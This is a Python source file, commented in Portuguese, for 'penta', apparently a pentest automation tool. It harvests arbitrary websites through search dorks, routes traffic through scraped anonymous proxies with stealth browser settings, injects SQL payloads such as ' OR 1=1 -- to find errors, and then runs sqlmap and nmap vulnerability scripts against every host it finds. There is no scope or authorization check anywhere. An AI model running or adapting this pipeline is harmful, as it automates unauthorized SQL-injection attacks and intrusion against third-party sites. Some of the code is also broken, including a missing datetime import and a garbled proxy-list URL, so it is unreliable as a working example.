#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
penta - Pentest Automation Tool (v2.0.1 - Async Stabilized)

Repositório: https://github.com/FuturoDevJunior/penta
By: linkedin.com/in/devferreirag

Versão assíncrona focada em estabilidade e funcionalidade.
Coleta proxies, dorking, pré-check SQLi, testes SQLi (sqlmap) e
varredura Nmap.

Requisitos:
- Python 3.9+
- Google Chrome / Firefox
- sqlmap e nmap instalados no PATH
- Dependências: requests, rich, selenium, selenium-stealth, 
                duckduckgo_search, beautifulsoup4, aiohttp, aiodns (recomendado)

Uso:
    python penta_v2_1.py -d dorks.txt -c 5 --dork-engine selenium --headless

Versão: 2.0.1
"""

import os
import re
import time
import json
import random
import asyncio
import subprocess
import logging
import argparse
import traceback
import shutil  # Movido para o topo
from urllib.parse import urlparse, quote
from typing import List, Set, Optional, Dict, Any, Tuple
from dataclasses import dataclass

# --- Networking ---
import aiohttp
import urllib3

# --- Desabilitar warnings SSL ---
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- UI & Logging ---
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn
    from rich.logging import RichHandler
    RICH_AVAILABLE = True
    console = Console(stderr=True, highlight=False)
    logging.basicConfig(
        level=logging.INFO,
        format='%(message)s',
        datefmt='[%X]',
        handlers=[RichHandler(console=console, rich_tracebacks=True, show_path=False)]
    )
except ImportError:
    RICH_AVAILABLE = False
    console = None
    Progress = None
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%H:%M:%S'
    )
    logging.warning("'rich' não instalado. Interface simplificada ativada.")

log = logging.getLogger("penta")

# --- Selenium ---
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from bs4 import BeautifulSoup
    SELENIUM_AVAILABLE = True
    try:
        from selenium_stealth import stealth as selenium_stealth
        SELENIUM_STEALTH_AVAILABLE = True
    except ImportError:
        SELENIUM_STEALTH_AVAILABLE = False
        log.warning("selenium-stealth não encontrado.")
except ImportError:
    SELENIUM_AVAILABLE = False
    log.error("selenium ou beautifulsoup4 não encontrados. Dorking Selenium desativado.")

# --- DDGS ---
try:
    from duckduckgo_search import DDGS
    DUCKDUCKGO_AVAILABLE = True
except ImportError:
    DUCKDUCKGO_AVAILABLE = False
    log.warning("duckduckgo_search não encontrado. Dorking DDGS desativado.")

# --- Constantes ---
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
]
WORKING_PROXIES_CACHE_FILE = ".penta_proxies_cache.json"
CACHE_PROXY_TTL_HOURS = 6
PROXY_TIMEOUT = 7.0
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=elite",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://api.openproxylist.xyz/http.txt",
    "https://raw.githubusercontent.com/ウォルターホワイト/proxy-list/main/http.txt",
]
SQL_ERROR_PATTERNS = [
    re.compile(p, re.I) for p in [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"ORA-[0-9]{4,}",
        r"Unclosed quotation mark", r"error in your SQL syntax",
        r"Microsoft OLE DB Provider", r"PostgreSQL.*ERROR", r"SQLite error",
        r"MySqlClient\.", r"SqlCommand", r"JdbcSQLException", r"DB2 SQL error",
        r"Sybase message:", r"Unterminated string constant",
        r"You have an error in your SQL syntax", r"check the manual that corresponds to your MySQL"
    ]
]
SQLI_PAYLOADS = ["'", '"', "`", "%27", " AND 1=1 --", " OR 1=1 --", "' OR '1'='1"]
SQLMAP_TIMEOUT = 300
NMAP_TIMEOUT = 600

# --- Funções Auxiliares ---
def _sanitize_filename(name: str) -> str:
    """Remove caracteres inválidos de uma string para usar como nome de arquivo."""
    name = re.sub(r'https?://', '', name) # Remove http/https
    name = re.sub(r'[\\/*?:"<>|]', '_', name) # Substitui inválidos por _
    name = name.replace(':', '_').replace('/', '_') # Substitui : e /
    return name[:100] # Limita o tamanho

# --- Dataclasses ---
@dataclass
class Config:
    dork_file: str
    max_results: int
    sqli_concurrency: int
    nmap_concurrency: int
    sqlmap_threads: int
    nmap_dir: str
    sqlmap_dir: str
    output_file: str
    headless: bool
    force_proxy_fetch: bool
    proxy_test_concurrency: int
    dork_engine: str
    sqlmap_level: int
    sqlmap_risk: int
    skip_precheck: bool
    skip_nmap: bool
    skip_sqlmap: bool
    proxy_timeout: float = PROXY_TIMEOUT

# --- Gerenciador de Proxies ---
class ProxyManager:
    def __init__(self, config: Config):
        self.config = config
        self._proxies: Set[str] = set()
        self._blacklist: Dict[str, float] = {}
        self._lock = asyncio.Lock()

    async def _fetch_source(self, session: aiohttp.ClientSession, url: str) -> Set[str]:
        # ... (Mantido igual à v2.0.0, já era razoável) ...
        found = set()
        try:
            async with session.get(url, timeout=15) as response:
                if response.status == 200:
                    text = await response.text()
                    lines = text.splitlines()
                    for line in lines:
                        proxy = line.strip()
                        if re.match(r"^\d{1,3}(\.\d{1,3}){3}:\d+$", proxy):
                            found.add(proxy)
                    log.info(f"Baixados {len(found)} proxies de {url}")
                else:
                    log.warning(f"Falha ao baixar de {url} (Status {response.status})")
                return found
        except Exception as e:
            log.warning(f"Erro ao baixar de {url}: {e}")
            return found

    async def _test_proxy(self, session: aiohttp.ClientSession, proxy: str) -> Optional[str]:
        # ... (Mantido igual, mas agora recebe a sessão) ...
        test_url = "http://httpbin.org/ip"
        proxy_url = f"http://{proxy}"
        try:
            async with session.get(test_url, proxy=proxy_url, timeout=self.config.proxy_timeout) as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get("origin"):
                        return proxy
        except Exception:
            pass
        return None

    async def _get_proxies(self) -> Set[str]:
        if not self.config.force_proxy_fetch:
            loaded = self._load_from_cache()
            if loaded:
                self._proxies = loaded
                return self._proxies

        log.info("Buscando novos proxies...")
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            tasks = [self._fetch_source(session, url) for url in PROXY_SOURCES]
            results = await asyncio.gather(*tasks)
            all_fetched = set().union(*results)

        log.info(f"{len(all_fetched)} proxies únicos coletados. Iniciando testes...")
        
        tested_proxies: Set[str] = set()
        sem = asyncio.Semaphore(self.config.proxy_test_concurrency)
        
        # *** CORREÇÃO: Cria uma sessão por worker ***
        async def worker(proxy_list: List[str], progress=None, task_id=None):
            conn = aiohttp.TCPConnector(ssl=False, limit_per_host=10) # Ajuste o limit se necessário
            async with aiohttp.ClientSession(connector=conn) as test_session:
                for proxy in proxy_list:
                    async with sem:
                        working = await self._test_proxy(test_session, proxy)
                        if working:
                            tested_proxies.add(working)
                        if progress and task_id: progress.update(task_id, advance=1)
        
        # Divide a lista para os workers (aproximadamente)
        chunk_size = (len(all_fetched) // self.config.proxy_test_concurrency) + 1
        proxy_chunks = [list(all_fetched)[i:i + chunk_size] for i in range(0, len(all_fetched), chunk_size)]

        if RICH_AVAILABLE and Progress:
            with Progress( *Progress.get_default_columns(), console=console) as progress:
                task = progress.add_task("[green]Testando Proxies...", total=len(all_fetched))
                test_tasks = [worker(chunk, progress, task) for chunk in proxy_chunks if chunk]
                await asyncio.gather(*test_tasks)
        else:
            test_tasks = [worker(chunk) for chunk in proxy_chunks if chunk]
            await asyncio.gather(*test_tasks)

        self._proxies = tested_proxies
        log.info(f"{len(self._proxies)} proxies funcionais encontrados.")
        self._save_to_cache()
        return self._proxies

    # ... (_save_to_cache, _load_from_cache, get_proxy, report_fail - Mantidos) ...
    def _save_to_cache(self):
        try:
            with open(WORKING_PROXIES_CACHE_FILE, "w") as f:
                json.dump({"proxies": list(self._proxies), "timestamp": time.time()}, f)
        except IOError as e: log.error(f"Erro ao salvar cache de proxies: {e}")

    def _load_from_cache(self) -> Set[str]:
        if not os.path.isfile(WORKING_PROXIES_CACHE_FILE): return set()
        try:
            with open(WORKING_PROXIES_CACHE_FILE, "r") as f:
                data = json.load(f)
                if time.time() - data.get("timestamp", 0) <= CACHE_PROXY_TTL_HOURS * 3600:
                    log.info(f"Carregados {len(data.get('proxies', []))} proxies do cache.")
                    return set(data.get('proxies', []))
                log.info("Cache de proxies expirado.")
        except Exception as e: log.warning(f"Erro ao carregar cache: {e}")
        return set()

    async def get_proxy(self) -> Optional[str]:
        async with self._lock:
            available = [p for p in self._proxies if p not in self._blacklist or self._blacklist[p] < time.time()]
            if not available:
                log.warning("Todos os proxies na blacklist, limpando...")
                self._blacklist.clear()
                available = list(self._proxies)
                if not available:
                    log.warning("Nenhum proxy disponível. Tentando buscar novamente...")
                    await self._get_proxies() # Chama _get_proxies para buscar/testar
                    available = list(self._proxies)
                    if not available:
                        log.error("Falha crítica: Nenhum proxy funcional encontrado.")
                        return None
            return random.choice(available) if available else None

    async def report_fail(self, proxy: str):
        async with self._lock:
            log.debug(f"Proxy {proxy} falhou, adicionando à blacklist por 5 minutos.")
            self._blacklist[proxy] = time.time() + 300

    async def initialize(self):
        await self._get_proxies()


# --- Dorker ---
class Dorker:
    def __init__(self, config: Config, proxy_manager: ProxyManager):
        self.config = config
        self.proxy_manager = proxy_manager

    async def _dork_ddgs(self, dork: str) -> Set[str]:
        if not DUCKDUCKGO_AVAILABLE: return set()
        results: Set[str] = set()
        proxy = await self.proxy_manager.get_proxy()
        # *** CORREÇÃO: Formato correto para DDGS ***
        proxies_str = f"http://{proxy}" if proxy else None
        log.info(f"DDGS: Buscando '{dork}' (Proxy: {proxy or 'Nenhum'})")
        try:
            def search_sync():
                try:
                    with DDGS(proxies=proxies_str, timeout=20) as ddgs:
                        return {r["href"] for r in ddgs.text(dork, max_results=self.config.max_results) if "href" in r}
                except Exception as sync_e:
                    log.warning(f"DDGS: Erro Síncrono em '{dork}': {sync_e}")
                    return set()

            loop = asyncio.get_running_loop()
            results = await loop.run_in_executor(None, search_sync)
            log.info(f"DDGS: Encontrados {len(results)} para '{dork}'.")
            if not results and proxy: await self.proxy_manager.report_fail(proxy)
        except Exception as e:
            log.warning(f"DDGS: Erro Async ao buscar '{dork}': {e}")
            if proxy: await self.proxy_manager.report_fail(proxy)
        return results

    async def _dork_selenium(self, dork: str) -> Set[str]:
        # ... (Mantido igual à v2.0.0, sem proxy) ...
        if not SELENIUM_AVAILABLE: return set()
        log.info(f"SELENIUM: Buscando '{dork}'...")
        
        def run_selenium_sync():
            driver = None
            try:
                options = ChromeOptions()
                if self.config.headless: options.add_argument("--headless")
                options.add_argument("--disable-blink-features=AutomationControlled")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument(f"user-agent={random.choice(DEFAULT_USER_AGENTS)}")

                driver = webdriver.Chrome(options=options)
                if SELENIUM_STEALTH_AVAILABLE:
                     selenium_stealth(driver, languages=["en-US", "en"], vendor="Google Inc.", platform="Win32")

                driver.get(f"https://duckduckgo.com/?q={quote(dork)}&t=h_&ia=web")
                time.sleep(2)
                
                links: Set[str] = set()
                attempts = 0
                while len(links) < self.config.max_results and attempts < 15:
                    soup = BeautifulSoup(driver.page_source, "html.parser")
                    found_now = {a.get("href") for a in soup.select('a[data-testid="result-title-a"], a.result__a') 
                                 if a.get("href") and 'duckduckgo.com/y.js' not in a.get("href")}
                    
                    new_links = found_now - links
                    if not new_links and attempts > 5:
                        break 
                    
                    links.update(new_links)
                    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
                    time.sleep(random.uniform(1.5, 3.0))
                    attempts += 1
                
                return links
            except Exception as e:
                log.error(f"SELENIUM: Erro ao buscar '{dork}': {e}")
                return set()
            finally:
                if driver: driver.quit()

        loop = asyncio.get_running_loop()
        results = await loop.run_in_executor(None, run_selenium_sync)
        log.info(f"SELENIUM: Encontrados {len(results)} para '{dork}'.")
        return results

    async def search(self, dorks: List[str]) -> Set[str]:
        # ... (Mantido igual à v2.0.0) ...
        all_urls: Set[str] = set()
        engine_func = self._dork_selenium if self.config.dork_engine == "selenium" else self._dork_ddgs
        
        for dork in dorks:
            urls = await engine_func(dork)
            all_urls.update(urls)
            await asyncio.sleep(random.uniform(1.0, 3.0))
        
        return {url for url in all_urls if url.startswith('http')}


# --- SQLi Checker (Pré-check leve) ---
class SqlPreChecker:
    def __init__(self, config: Config, proxy_manager: ProxyManager):
        self.config = config
        self.proxy_manager = proxy_manager

    async def _check_url(self, session: aiohttp.ClientSession, url: str) -> Optional[str]:
        # ... (Mantido igual, mas agora recebe a sessão) ...
        for payload in SQLI_PAYLOADS:
            try:
                target_url = url + payload
                proxy = await self.proxy_manager.get_proxy()
                proxy_url = f"http://{proxy}" if proxy else None
                
                async with session.get(target_url, proxy=proxy_url, timeout=10, allow_redirects=True) as response:
                    text = await response.text()
                    for pattern in SQL_ERROR_PATTERNS:
                        if pattern.search(text):
                            log.warning(f"PRE-CHECK: Possível SQLi em {url} (Payload: {payload})")
                            return url
            except Exception as e:
                log.debug(f"PRE-CHECK: Erro menor em {url} ({payload}): {e}")
                pass
        return None

    async def check_urls(self, urls: Set[str]) -> Set[str]:
        if self.config.skip_precheck:
            log.info("Pulando Pré-Check SQLi.")
            return urls

        log.info(f"Iniciando Pré-Check SQLi em {len(urls)} URLs...")
        potentially_vulnerable: Set[str] = set()
        sem = asyncio.Semaphore(50)
        
        # *** CORREÇÃO: Cria uma sessão por worker ***
        async def worker(url_list: List[str], progress=None, task_id=None):
            conn = aiohttp.TCPConnector(ssl=False, limit_per_host=5)
            headers = {'User-Agent': random.choice(DEFAULT_USER_AGENTS)}
            async with aiohttp.ClientSession(connector=conn, headers=headers) as session:
                for url in url_list:
                    async with sem:
                        result = await self._check_url(session, url)
                        if result:
                            potentially_vulnerable.add(result)
                    if progress and task_id: progress.update(task_id, advance=1)

        chunk_size = (len(urls) // 50) + 1 # Divide para ~50 workers
        url_chunks = [list(urls)[i:i + chunk_size] for i in range(0, len(urls), chunk_size)]

        if RICH_AVAILABLE and Progress:
             with Progress(*Progress.get_default_columns(), console=console) as progress:
                 task = progress.add_task("[yellow]Pré-Check SQLi...", total=len(urls))
                 tasks = [worker(chunk, progress, task) for chunk in url_chunks if chunk]
                 await asyncio.gather(*tasks)
        else:
            tasks = [worker(chunk) for chunk in url_chunks if chunk]
            await asyncio.gather(*tasks)

        log.info(f"Pré-Check finalizado. {len(potentially_vulnerable)} URLs suspeitas.")
        return potentially_vulnerable if potentially_vulnerable else urls


# --- Subprocess Runners (Sqlmap/Nmap) ---
class SubprocessRunner:
    def __init__(self, config: Config, proxy_manager: ProxyManager):
        self.config = config
        self.proxy_manager = proxy_manager
        self.sqlmap_sem = asyncio.Semaphore(config.sqli_concurrency)
        self.nmap_sem = asyncio.Semaphore(config.nmap_concurrency)

    async def _run_command(self, cmd: List[str], timeout: int, log_prefix: str, output_dir: str, target: str) -> Tuple[bool, str]:
        proc = None
        # *** CORREÇÃO: Sanitiza nome do arquivo de log ***
        sanitized_target = _sanitize_filename(target)
        try:
            log.debug(f"{log_prefix}: Executando: {' '.join(cmd)}")
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            
            output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
            
            os.makedirs(output_dir, exist_ok=True)
            log_file = os.path.join(output_dir, f"{log_prefix.lower()}_{sanitized_target}.log")
            try:
                with open(log_file, "w", encoding='utf-8') as f: f.write(output)
            except Exception as io_err:
                 log.error(f"{log_prefix}: Erro ao salvar log {log_file}: {io_err}")

            return proc.returncode == 0 or "injection" in output.lower() or "vulnerable" in output.lower(), output

        except asyncio.TimeoutError:
            log.warning(f"{log_prefix}: Timeout ao executar em {target}")
            if proc:
                try: proc.kill()
                except ProcessLookupError: pass
            return False, "Timeout"
        except Exception as e:
            log.error(f"{log_prefix}: Erro ao executar em {target}: {e}")
            if proc and proc.returncode is None:
                try: proc.kill()
                except ProcessLookupError: pass
            return False, str(e)

    async def run_sqlmap(self, url: str) -> Optional[str]:
        # ... (Mantido igual, mas agora usa _run_command corrigido) ...
        if not self.config.skip_sqlmap:
            async with self.sqlmap_sem:
                proxy = await self.proxy_manager.get_proxy()
                output_path = os.path.join(self.config.sqlmap_dir, _sanitize_filename(urlparse(url).netloc))
                
                cmd = [
                    "sqlmap", "-u", url, "--batch", "--random-agent", "--flush-session",
                    f"--level={self.config.sqlmap_level}", f"--risk={self.config.sqlmap_risk}",
                    f"--threads={self.config.sqlmap_threads}",
                    "--technique=BEUSTQ", "--output-dir", output_path, "--disable-coloring",
                ]
                if proxy: cmd += ["--proxy", f"http://{proxy}"]

                log.info(f"SQLMAP: Testando {url}...")
                success, output = await self._run_command(cmd, SQLMAP_TIMEOUT, "SQLMAP", self.config.sqlmap_dir, url)

                if re.search(r"(sql injection|is vulnerable|identified the following injection points)", output, re.I):
                    log.warning(f"SQLMAP: [VULNERÁVEL] {url}")
                    return url
                else:
                    log.info(f"SQLMAP: Não vulnerável {url}")
                    if not success and proxy: await self.proxy_manager.report_fail(proxy)
        return None

    async def run_nmap(self, host: str) -> Optional[str]:
        # ... (Mantido igual, mas agora usa _run_command corrigido) ...
         if not self.config.skip_nmap:
            async with self.nmap_sem:
                output_file = os.path.join(self.config.nmap_dir, f"nmap_{_sanitize_filename(host)}.xml")
                cmd = ["nmap", "-sV", "-T4", "-A", "--script=vuln", "-oX", output_file, host]
                
                log.info(f"NMAP: Iniciando scan em {host}...")
                success, output = await self._run_command(cmd, NMAP_TIMEOUT, "NMAP", self.config.nmap_dir, host)
                
                if success:
                    log.info(f"NMAP: Scan de {host} concluído. Salvo em {output_file}")
                    return host
                else:
                    log.error(f"NMAP: Falha no scan de {host}")
         return None


# --- Core Orchestrator ---
class PentaCore:
    def __init__(self, config: Config):
        self.config = config
        self.proxy_manager = ProxyManager(config)
        self.dorker = Dorker(config, self.proxy_manager)
        self.pre_checker = SqlPreChecker(config, self.proxy_manager)
        self.runner = SubprocessRunner(config, self.proxy_manager)
        self.all_urls: Set[str] = set()
        self.sqli_urls: Set[str] = set()
        self.nmap_hosts: Set[str] = set()

    def _load_dorks(self) -> List[str]:
        # ... (Mantido igual) ...
        try:
            with open(self.config.dork_file, "r", encoding="utf-8") as f:
                dorks = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
            log.info(f"Carregados {len(dorks)} dorks de {self.config.dork_file}")
            return dorks
        except FileNotFoundError:
            log.critical(f"Arquivo de dorks '{self.config.dork_file}' não encontrado.")
            return []

    def _extract_host(self, url: str) -> Optional[str]:
        # ... (Mantido igual, mas mais robusto) ...
        try: 
            parsed = urlparse(url)
            if parsed.netloc:
                return parsed.netloc.split(':')[0]
        except Exception as e:
            log.debug(f"Não foi possível extrair host de '{url}': {e}")
        return None

    def _save_report(self):
        # ... (Mantido igual) ...
        report = {
            "timestamp": datetime.now().isoformat(),
            "config": vars(self.config),
            "urls_dorked_count": len(self.all_urls),
            "urls_sqli_vulnerable_count": len(self.sqli_urls),
            "hosts_scanned_nmap_count": len(self.nmap_hosts),
            "urls_sqli_vulnerable": list(self.sqli_urls),
            "hosts_scanned_nmap": list(self.nmap_hosts),
        }
        try:
            with open(self.config.output_file, "w", encoding="utf-8") as f:
                json.dump(report, f, indent=4, ensure_ascii=False)
            log.info(f"Relatório final salvo em {self.config.output_file}")
        except IOError as e: log.error(f"Erro ao salvar relatório final: {e}")

    async def run(self):
        # ... (Mantido igual, mas agora chama os componentes corrigidos) ...
        start_time = time.monotonic()
        if RICH_AVAILABLE: console.rule("[bold magenta]Penta v2.0.1 - Async Stabilized[/bold magenta]")
        
        dorks = self._load_dorks()
        if not dorks: return

        await self.proxy_manager.initialize()

        self.all_urls = await self.dorker.search(dorks)
        if not self.all_urls:
            log.warning("Nenhuma URL coletada. Encerrando.")
            return

        urls_to_test_sqli = await self.pre_checker.check_urls(self.all_urls)
        
        if not self.config.skip_sqlmap and urls_to_test_sqli:
            log.info(f"Iniciando testes SQLMAP em {len(urls_to_test_sqli)} URLs...")
            sqli_tasks = [self.runner.run_sqlmap(url) for url in urls_to_test_sqli]
            results = await asyncio.gather(*sqli_tasks)
            self.sqli_urls = {res for res in results if res}
            log.info(f"SQLMAP: {len(self.sqli_urls)} URLs vulneráveis encontradas.")
        else:
             log.info("Pulando testes SQLMap (skip ativado ou sem URLs suspeitas).")

        if self.sqli_urls and not self.config.skip_nmap:
            hosts_to_scan = {self._extract_host(url) for url in self.sqli_urls if self._extract_host(url)}
            log.info(f"Iniciando NMAP em {len(hosts_to_scan)} hosts...")
            nmap_tasks = [self.runner.run_nmap(host) for host in hosts_to_scan]
            results = await asyncio.gather(*nmap_tasks)
            self.nmap_hosts = {res for res in results if res}
            log.info(f"NMAP: {len(self.nmap_hosts)} hosts escaneados.")
        elif not self.config.skip_nmap:
             log.info("Pulando NMAP (sem alvos SQLi ou skip_nmap ativado).")

        self._save_report()
        end_time = time.monotonic()
        log.info(f"Execução completa em {end_time - start_time:.2f} segundos.")
        if RICH_AVAILABLE: console.rule("[bold green]Finalizado[/bold green]")


# --- Main ---
def main():
    parser = argparse.ArgumentParser(description="Penta v2.0.1 - Ferramenta Pentest Assíncrona")
    # ... (Argumentos mantidos) ...
    parser.add_argument("-d", "--dork-file", default="dorks.txt", help="Arquivo de dorks.")
    parser.add_argument("-m", "--max-results", type=int, default=30, help="Resultados por dork.")
    parser.add_argument("-c", "--sqli-concurrency", type=int, default=5, help="Processos sqlmap concorrentes.")
    parser.add_argument("--nmap-concurrency", type=int, default=3, help="Processos nmap concorrentes.")
    parser.add_argument("-t", "--sqlmap-threads", type=int, default=5, help="Threads internas do sqlmap.")
    parser.add_argument("--nmap-dir", default="nmap_output_v2", help="Diretório Nmap.")
    parser.add_argument("--sqlmap-dir", default="sqlmap_output_v2", help="Diretório SQLMap.")
    parser.add_argument("-o", "--output-file", default="penta_report_v2.json", help="Arquivo de relatório.")
    parser.add_argument("--headless", action="store_true", help="Selenium headless.")
    parser.add_argument("--force-proxy-fetch", action="store_true", help="Forçar busca de proxies.")
    parser.add_argument("--proxy-threads", dest="proxy_test_concurrency", type=int, default=200, help="Threads para teste de proxy.")
    parser.add_argument("--dork-engine", choices=["selenium", "ddgs"], default="selenium", help="Motor de busca (selenium/ddgs).")
    parser.add_argument("--sqlmap-level", type=int, default=3, choices=[1,2,3,4,5], help="Nível do sqlmap.")
    parser.add_argument("--sqlmap-risk", type=int, default=2, choices=[1,2,3], help="Risco do sqlmap.")
    parser.add_argument("--skip-precheck", action="store_true", help="Pular pré-check SQLi.")
    parser.add_argument("--skip-sqlmap", action="store_true", help="Pular testes SQLMap.")
    parser.add_argument("--skip-nmap", action="store_true", help="Pular scans NMap.")
    
    args = parser.parse_args()
    config = Config(**vars(args))

    # Cria diretórios
    os.makedirs(config.nmap_dir, exist_ok=True)
    os.makedirs(config.sqlmap_dir, exist_ok=True)

    # *** CORREÇÃO: Verifica ferramentas ANTES de iniciar ***
    if not config.skip_sqlmap and not shutil.which("sqlmap"):
        log.critical("sqlmap não encontrado no PATH. Use --skip-sqlmap ou instale-o.")
        return
    if not config.skip_nmap and not shutil.which("nmap"):
        log.critical("nmap não encontrado no PATH. Use --skip-nmap ou instale-o.")
        return

    core = PentaCore(config)
    try:
        asyncio.run(core.run())
    except KeyboardInterrupt:
        log.info("Execução interrompida.")
    except Exception as e:
        log.critical(f"Erro fatal: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
